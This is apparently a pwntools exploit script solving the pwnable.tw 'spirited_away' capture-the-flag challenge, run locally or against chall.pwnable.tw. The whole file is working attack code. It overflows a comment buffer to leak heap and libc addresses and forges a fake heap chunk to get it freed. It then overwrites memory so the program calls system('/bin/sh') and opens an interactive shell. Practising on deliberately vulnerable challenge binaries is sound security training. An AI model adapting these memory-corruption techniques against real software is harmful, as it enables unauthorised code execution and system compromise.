from pwn import *

e = ELF("./spirited_away")
libc = ELF("./libc_32.so.6")

if "--remote" in sys.argv:
  p = remote("chall.pwnable.tw", 10204)
else:
  p = process(["./ld-linux-32.so", e.path], env={"LD_PRELOAD": libc.path})

def alloc(name="Name", comment="Comment", yn="y", checkage=False, checky=True):
  p.sendlineafter("name:", name)
  if checkage:
    p.sendlineafter("age:", "1")
  p.sendlineafter("movie?", "Reason")
  p.sendlineafter("comment:", comment)
  
  if checky:
    p.sendlineafter("<y/n>:", yn)

def free(idx):
  global heap_base

  alloc(comment="A" * (0x50 + 4) + p32(heap_base + 0x410 + 0x40 * idx))

for i in range(100):
  alloc(checkage=True)  

print("{:#x}".format(e.symbols["cnt"]))

alloc(comment="A" * (0x50 - 1 + 4), checky=False)

p.recvuntil("Comment: AAAAAA")
p.recvline()

heap_base = u32(p.recvline()[:4]) - 0x410
print("Heap Base: {:#x}".format(heap_base))
p.sendafter("<y/n>:", "yA" + p32(0x40)[0])

alloc(comment="A" * (0x50 + 4) + p32(0))
free(1)
alloc(name="AAA", checky=False)

#alloc(name="A" * 0x3c, comment="A" * (0x50 + 4) + p32(0))
#alloc(name="A" * 0x3c, comment="A" * (0x50 + 4) + p32(0))

p.recvuntil("Name: AAA")
p.recvline()

libc_base = u32(p.recvline()[:4]) - 0xf7f17ac0 + 0xf7d67000
print("Libc Base: {:#x}".format(libc_base))
p.sendafter("<y/n>:", "yA" + p32(0x40)[0])

free(1)
arena = libc_base -  0xf7e17000 + 0xf7fc77b0 

alloc(name="A" * (0x40 - 4) + p32(0x41) + p32(arena) + p32(e.symbols["cnt"] - 8), comment="A" * (0x50 + 4) + p32(0))
alloc(comment="A" * (0x50 + 4) + p32(heap_base + 0x410))
p.sendlineafter("name:", "Name")
p.sendlineafter("movie?", "Reason")

# The second p32(e.symbols["cnt"]) just has to be any valid address because it's printfd. 
p.sendlineafter("comment:", "A" * 0x50 + p32(0) + p32(e.symbols["cnt"]) + "A" * 0x54 + p32(libc_base + libc.symbols["system"]) + p32(0x1337) + p32(libc_base + next(libc.search("/bin/sh"))))
p.sendlineafter("<y/n>:", "n")



p.interactive()
